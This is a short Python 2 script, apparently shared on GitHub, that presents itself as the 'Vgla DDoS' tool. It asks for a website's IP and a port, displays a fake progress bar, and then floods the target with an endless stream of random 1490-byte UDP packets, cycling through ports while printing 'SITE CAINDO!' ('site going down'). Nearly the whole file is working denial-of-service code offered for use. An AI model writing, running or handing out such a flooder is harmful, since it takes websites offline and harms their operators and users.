import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")


print "██╗   ██╗ ██████╗ ██╗      █████╗      █████╗ ████████╗██╗  ██╗"
print "██║   ██║██╔════╝ ██║     ██╔══██╗    ██╔══██╗╚══██╔══╝██║ ██╔╝"
print "██║   ██║██║  ███╗██║     ███████║    ███████║   ██║   █████╔╝ "
print "╚██╗ ██╔╝██║   ██║██║     ██╔══██║    ██╔══██║   ██║   ██╔═██╗ "
print "╚████╔╝ ╚██████╔╝███████╗██║  ██║    ██║  ██║   ██║   ██║  ██╗"
print "  ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝"
                                                               
                                                    
                                                    
print
print "Vgla DDoS - Made By Vgla"
print "YouTube: https://www.youtube.com/@VglaRat"
print "GitHub: https://github.com/Vgla7"
print
ip = raw_input("IP Do Site: ")
port = input("Porta: ")

os.system("clear")
print "[                    ] 0% "
time.sleep(1)
print "[=====               ] 25%"
time.sleep(1)
print "[==========          ] 50%"
time.sleep(1)
print "[===============     ] 75%"
time.sleep(1)
print "[====================] 100%"
time.sleep(1)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "SITE CAINDO!"
     print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
     if port == 65534:
       port = 1
